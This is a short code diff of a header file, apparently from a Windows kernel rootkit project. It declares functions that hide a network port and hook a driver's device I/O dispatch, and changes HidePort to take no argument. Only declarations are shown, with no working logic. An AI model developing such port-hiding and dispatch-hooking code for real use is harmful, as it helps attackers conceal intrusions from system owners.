@@ -40,7 +40,7 @@ namespace Rootkit
 		extern PDRIVER_DISPATCH PreviousDispatch;
 		extern NetInfo Net;
 
-		NTSTATUS HidePort(USHORT Port);
+		NTSTATUS HidePort();
 		NTSTATUS HookDeviceIo(PDEVICE_OBJECT DeviceObject, PIRP pIrp);
 		VOID UnloadHook();
 	}
